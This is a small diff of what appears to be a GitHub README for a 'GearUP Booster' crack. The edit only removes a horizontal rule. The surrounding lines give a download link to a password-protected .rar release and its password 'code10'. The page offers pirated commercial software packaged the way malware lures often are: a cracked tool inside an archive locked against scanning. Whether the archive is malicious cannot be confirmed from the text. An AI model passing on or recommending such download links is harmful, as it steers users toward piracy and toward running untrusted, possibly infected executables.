@@ -8,7 +8,7 @@
  <p align="center">
     <img src="https://i.imgur.com/XBy8lST.jpeg" width="750">
   </p>
----
+
 
 # [Download](https://github.com/maxxximgb/gearup-booster-crack/releases/download/Latest/GearUP.Booster.rar)
 🔐 Password: code10
